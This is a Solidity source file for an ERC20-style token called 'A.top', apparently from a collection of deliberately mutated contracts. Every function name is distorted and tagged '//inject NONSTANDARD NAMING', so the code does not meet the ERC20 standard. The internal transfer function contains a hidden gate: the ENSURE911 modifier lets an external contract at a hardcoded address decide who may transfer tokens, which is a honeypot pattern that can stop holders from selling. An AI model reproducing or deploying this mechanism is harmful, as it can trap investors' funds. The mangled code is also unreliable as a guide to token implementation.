                                                                 

pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY315() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF766(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER340(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE708(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE946(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM413(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER693(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL707(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function ISPARTNER618(address) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
        // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER2() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = 0xC8Ab6B545D9D292e702A9f7Abf2461edbD150aA9;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY315() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF766(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER340(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER402(_MSGSENDER2(), recipient, amount);
        return true;
    }

    function ALLOWANCE708(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE946(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE228(_MSGSENDER2(), spender, amount);
        return true;
    }

    function TRANSFERFROM413(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER402(sender, recipient, amount);
        _APPROVE228(sender, _MSGSENDER2(), _allowances[sender][_MSGSENDER2()].SUB767(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE330(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE228(_MSGSENDER2(), spender, _allowances[_MSGSENDER2()][spender].ADD557(addedValue));
        return true;
    }

    function DECREASEALLOWANCE328(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE228(_MSGSENDER2(), spender, _allowances[_MSGSENDER2()][spender].SUB767(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER402(address sender, address recipient, uint amount) internal ENSURE911(sender) {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB767(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD557(amount);
        emit TRANSFER693(sender, recipient, amount);
    }

    function _MINT804(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD557(amount);
        _balances[account] = _balances[account].ADD557(amount);
        emit TRANSFER693(address(0), account, amount);
    }

    function _BURN341(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB767(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB767(amount);
        emit TRANSFER693(account, address(0), amount);
    }

    modifier ENSURE911(address sender) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).ISPARTNER618(sender));
        _;
    }

    function _APPROVE228(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL707(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME623() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL711() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS261() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD557(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB767(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB767(a, b, "SafeMath: subtraction overflow");
    }

    function SUB767(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL55(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV391(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV391(a, b, "SafeMath: division by zero");
    }

    function DIV391(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT141(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER349(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN899(token, abi.encodeWithSelector(token.TRANSFER340.selector, to, value));
    }

    function SAFETRANSFERFROM933(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN899(token, abi.encodeWithSelector(token.TRANSFERFROM413.selector, from, to, value));
    }

    function SAFEAPPROVE412(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE708(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN899(token, abi.encodeWithSelector(token.APPROVE946.selector, spender, value));
    }

    function CALLOPTIONALRETURN899(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT141(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract AT is ERC20, ERC20Detailed {

    mapping(address => bool) public minters;
    constructor() public ERC20Detailed("A.top","AT",18) {
        _MINT804(msg.sender, 10000 * 10 ** 18);
    }




}